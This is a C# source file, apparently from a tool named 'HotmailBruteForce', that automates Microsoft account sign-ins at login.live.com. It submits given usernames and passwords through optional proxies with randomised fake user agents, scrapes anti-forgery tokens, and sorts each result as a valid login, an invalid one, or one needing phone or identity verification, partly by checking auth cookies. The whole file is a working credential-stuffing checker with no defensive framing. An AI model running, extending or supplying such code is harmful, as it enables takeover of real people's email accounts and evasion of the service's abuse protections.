using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HotmailBruteForce
{
    public class Services
    {
        // Identify Function
        private static readonly Random rand = new Random();
        private static readonly object syncLock = new object();
        private static readonly Random random = new Random();
        // Http Function
        public static async Task<string> InitializeLoginMethod(string username, string password, string proxyIP = null, int? proxyPort = null, string proxyUsername = null, string proxyPassword = null)
        {
            HttpClientHandler handler = null;

            if (!string.IsNullOrEmpty(proxyIP) && proxyPort.HasValue)
            {
                string proxyAddress = $"{proxyIP}:{proxyPort}";
                handler = new HttpClientHandler
                {
                    Proxy = !string.IsNullOrEmpty(proxyUsername) && !string.IsNullOrEmpty(proxyPassword) ?
                        new WebProxy(proxyAddress) { Credentials = new NetworkCredential(proxyUsername, proxyPassword) } :
                        new WebProxy(proxyAddress),
                    UseProxy = true
                };
            }
            else
            {
                handler = new HttpClientHandler { UseProxy = false };
            }

            using (HttpClient httpClient = new HttpClient(handler))
            {
                httpClient.BaseAddress = new Uri("https://login.live.com/");
                httpClient.DefaultRequestHeaders.Add("User-Agent", GetRandomUserAgent());

                HttpResponseMessage responseMessage = await httpClient.GetAsync(@"login.srf?wa=wsignin1.0&rpsnv=151&ct=1714219014&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d5ecca56f-89d0-4aed-853f-b1667ba8df38&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015");

                if (!responseMessage.IsSuccessStatusCode)
                    return "Retries";

                string responseBody = await responseMessage.Content.ReadAsStringAsync();

                string AADC1 = GetValueUsingRegex(responseBody, "value");
                string loginNew = GetValueByRegexInput(responseBody, "urlPost\\s*:\\s*'([^']*)'");

                if (loginNew == null || AADC1 == null)
                    return "Retries";

                int i19 = GenerateRandomNumber(1111, 111111);
                string loginData = GenerateLoginData(username, password, AADC1, i19);
                StringContent content = new StringContent(loginData, Encoding.UTF8, "application/x-www-form-urlencoded");

                using (HttpResponseMessage postResponseMessage = await httpClient.PostAsync(loginNew, content))
                {
                    if (!postResponseMessage.IsSuccessStatusCode)
                        return "Retries";

                    string postResponseBody = await postResponseMessage.Content.ReadAsStringAsync();
                    IEnumerable<string> cookieValues = postResponseMessage.Headers.GetValues("Set-Cookie");
                    string cookies = string.Join("; ", cookieValues);

                    if (IsInvalidAccount(postResponseBody))
                        return "Fails";

                    if (IsSuccessAccount(responseBody) || (CheckCookieExists(cookies) && IsCustomAccount(responseBody)))
                        return "Success";

                    if (IsCustomAccount(postResponseBody))
                    {
                        string fmHFAction = FindValueById(postResponseBody, "fmHF", "action");
                        string iptValue = FindValueById(postResponseBody, "ipt", "value");
                        string ppridValue = FindValueById(postResponseBody, "pprid", "value");
                        string uaidValue = FindValueById(postResponseBody, "uaid", "value");
                        string verifyContent = $"uaid={uaidValue}&ipt={iptValue}&pprid={ppridValue}";
                        StringContent contentPost = new StringContent(verifyContent, Encoding.UTF8, "application/x-www-form-urlencoded");

                        using (HttpResponseMessage verifyPostMessage = await httpClient.PostAsync(fmHFAction, contentPost))
                        {
                            if (!verifyPostMessage.IsSuccessStatusCode)
                                return "Retries";

                            string verifyResponseBody = await verifyPostMessage.Content.ReadAsStringAsync();

                            if (IsVeriphoneAccount(verifyResponseBody))
                                return "Veriphone";

                            if (IsIdentity(verifyResponseBody))
                                return "Identity";
                        }
                    }

                    return "Other";
                }
            }
        }
        private static string GenerateLoginData(string username, string password, string AADC1, int i19)
        {
            return $@"i13=0&login={username}&loginfmt={username}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={AADC1}&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19={i19}";
        }
        // KeyCheck Function
        private static bool IsInvalidAccount(string responseBody)
        {
            return responseBody.Contains(@"account doesn\'t exist.") ||
                   responseBody.Contains(@"Please enter the password for your Microsoft account.") ||
                    responseBody.Contains(@"You\'ve tried to sign in too many times with an incorrect account or password.") ||
                     responseBody.Contains(@"Your account or password is incorrect. If you don\\'t remember your password,") ||
                      responseBody.Contains(@"Your account or password is incorrect. If you don\'t remember your password, ") ||
                      responseBody.Contains(@"Your account or password is incorrect.") ||
                      responseBody.Contains(@"The account or password is incorrect. Please try again.") ||
                       responseBody.Contains(@"I:'<USER>',");
        }
        private static bool IsCustomAccount(string responseBody)
        {
            return responseBody.Contains("action=\"https://account.live.com/recover") ||
                   responseBody.Contains("action=\"https://account.live.com/Abuse") ||
                   responseBody.Contains("action=\"https://account.live.com/ar/cancel") ||
                   responseBody.Contains("action=\"https://account.live.com/identity/confirm") ||
                   responseBody.Contains("<title>Help us protect your account") ||
                   responseBody.Contains("action=\"https://account.live.com/RecoverAccount") ||
                   responseBody.Contains("action=\"https://account.live.com/Email/Confirm") ||
                   responseBody.Contains("action=\"https://account.live.com/Abuse");
        }
        private static bool IsSuccessAccount(string responseBody)
        {
            return responseBody.Contains("Stay signed in?") ||
                   responseBody.Contains("https://account.live.com/proofs/remind?");
        }
        private static bool IsVeriphoneAccount(string responseBody)
        {
            return responseBody.Contains($@"https://account.live.com/API/ac/CollectPhone");
        }
        private static bool IsIdentity(string responseBody)
        {
            return responseBody.Contains($@"account.live.com/identity/");
        }
        public static bool CheckCookieExists(string input)
        {
            string[] cookieNamesToCheck = { "JSH", "MSPSoftVis", "SDIDC", "__Host-MSAAUTH" };
            foreach (string cookieName in cookieNamesToCheck)
            {
                if (input.Contains(cookieName))
                {
                    return true;
                }
            }

            return false;
        }
        // Fake Method Function
        public static string GetRandomUserAgent()
        {
            string userAgent = "";
            var browserType = new string[] { "chrome", "firefox", };
            var UATemplate = new Dictionary<string, string> { { "chrome", "Mozilla/5.0 ({0}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{1} Safari/537.36" }, { "firefox", "Mozilla/5.0 ({0}; rv:{1}.0) Gecko/20100101 Firefox/{1}.0" }, };
            var OS = new string[] { "Windows NT 10.0; Win64; x64", "X11; Linux x86_64", "Macintosh; Intel Mac OS X 12_4" };
            string OSsystem = "";
            lock (syncLock)
            { // synchronize
                OSsystem = OS[rand.Next(OS.Length)];
                int version = rand.Next(93, 104);
                int minor = 0;
                int patch = rand.Next(4950, 5162);
                int build = rand.Next(80, 212);
                string randomBroswer = browserType[rand.Next(browserType.Length)];
                string browserTemplate = UATemplate[randomBroswer];
                string finalVersion = version.ToString();
                if (randomBroswer == "chrome")
                {
                    finalVersion = String.Format("{0}.{1}.{2}.{3}", version, minor, patch, build);
                }

                userAgent = String.Format(browserTemplate, OSsystem, finalVersion);
            }

            return userAgent;
        }
        // Support Function
        public static string GetCurrentUnixTime()
        {
            var unixTime = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
            return unixTime.ToString();
        }
        public static int GenerateRandomNumber(int min, int max)
        {
            return random.Next(min, max + 1);
        }
        private static string ParseLeftRight(string text, string leftParam, string rightParam)
        {
            int leftIndex = text.IndexOf(leftParam);
            if (leftIndex == -1) return null;
            leftIndex += leftParam.Length;
            int rightIndex = text.IndexOf(rightParam);
            if (rightIndex == -1) return null;
            return text.Substring(leftIndex, rightIndex - leftIndex);

        }
        public static string GetValueUsingRegex(string text, string value)
        {
            string pattern = $@"{Regex.Escape(value)}\s*=\s*""([^""]*)""";

            Match match = Regex.Match(text, pattern);

            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            else
            {
                return null;
            }
        }
        public static string GetValueByRegexInput(string text, string pattern)
        {
            Match match = Regex.Match(text, pattern);

            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            else
            {
                return null;
            }
        }
        public static string FindValueById(string text, string id,string indetify)
        {
            // Tìm chuỗi có id và giá trị value
            string pattern = $@"id=""{id}""\s+{indetify}=""([^""]*)""";
            Match match = Regex.Match(text, pattern);

            // Nếu tìm thấy, trả về giá trị value, ngược lại trả về null
            return match.Success ? match.Groups[1].Value : null;
        }

    }
}
